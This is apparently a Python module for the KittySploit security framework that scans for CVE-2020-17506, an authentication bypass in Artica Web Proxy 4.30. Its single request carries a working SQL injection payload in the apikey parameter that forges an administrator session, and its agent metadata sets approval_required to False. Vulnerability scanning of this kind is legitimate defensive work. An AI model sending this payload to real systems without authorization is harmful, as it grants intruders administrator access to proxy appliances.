#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Artica Web Proxy 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Artica Web Proxy 4.30 - Authentication Bypass/SQL Injection Detection',
        'description': 'Artica Web Proxy 4.30.00000000 allows remote attacker to bypass privilege detection and gain web backend administrator privileges through SQL injection of the apikey parameter in fw.login.php.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'artica', 'proxy', 'packetstorm', 'articatech', 'sqli', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-17506',
            'http://packetstormsecurity.com/files/158868/Artica-Proxy-4.3.0-Authentication-Bypass.html',
            'https://blog.max0x4141.com/post/artica_proxy/',
            'https://github.com/hangmansROP/proof-of-concepts',
        ],
        'cve': 'CVE-2020-17506',
    }

    def run(self):
        r = self.http_request(method="GET", path='/fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27;', allow_redirects=True)
        if not r or r.status_code not in (200, 301, 302):
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('artica-applianc',)
        header_any = ('PHPSESSID',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason="Artica Web Proxy 4.30 - Authentication Bypass/SQL Injection detected",
                path='/fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27;',
            )
            return True
        return False

